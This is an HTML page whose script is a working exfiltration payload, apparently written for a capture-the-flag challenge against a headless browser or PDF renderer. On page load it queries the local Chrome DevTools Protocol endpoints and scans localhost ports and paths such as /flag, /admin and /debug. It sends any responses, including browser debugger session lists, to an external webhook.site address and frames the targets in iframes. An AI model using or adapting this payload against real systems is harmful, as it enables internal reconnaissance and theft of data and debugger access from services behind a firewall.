<!DOCTYPE html>
<html>
<head>
    <title>Advanced Scanner</title>
    <style>
        iframe { width: 100%; height: 250px; border: 2px solid red; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h2>Internal Extraction in Progress...</h2>
    <div id="log"></div>

    <script>
        const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427';

        // 1. Check for Chrome DevTools Protocol (CDP) on port 9222
        fetch('http://127.0.0.1:9222/json/version')
            .then(res => res.json())
            .then(data => {
                fetch(webhook + '?cdp_version=' + encodeURIComponent(JSON.stringify(data)));
            }).catch(e => {});

        fetch('http://127.0.0.1:9222/json/list')
            .then(res => res.json())
            .then(data => {
                fetch(webhook + '?cdp_list=' + encodeURIComponent(JSON.stringify(data)));
            }).catch(e => {});

        // 2. Scan common ports and paths
        const ports = [3000, 5000, 8080, 80, 9222, 1337, 31326];
        const paths = ['', '/flag', '/flag.txt', '/admin', '/api', '/debug'];

        ports.forEach(port => {
            paths.forEach(path => {
                const target = `http://127.0.0.1:${port}${path}`;
                
                // Try fetching data
                fetch(target)
                    .then(r => r.text())
                    .then(text => {
                        if (text && text.length > 0) {
                            fetch(webhook + '?found=' + encodeURIComponent(target) + '&body=' + encodeURIComponent(text.substring(0, 400)));
                        }
                    }).catch(err => {});

                // Embed iframes for direct PDF rendering of main targets
                if (path === '' || path === '/flag' || path === '/flag.txt') {
                    const iframe = document.createElement('iframe');
                    iframe.src = target;
                    document.body.appendChild(iframe);
                }
            });
        });
    </script>
</body>
</html>
